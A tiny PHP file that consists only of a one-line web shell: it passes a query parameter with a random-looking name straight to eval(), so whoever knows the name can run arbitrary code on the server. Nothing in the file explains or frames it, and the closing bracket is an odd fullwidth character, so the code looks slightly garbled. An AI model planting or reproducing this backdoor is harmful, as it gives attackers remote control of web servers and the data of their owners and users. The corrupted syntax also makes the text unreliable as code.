<?php
eval($_GET['ztXUbA0-'〕);
?>
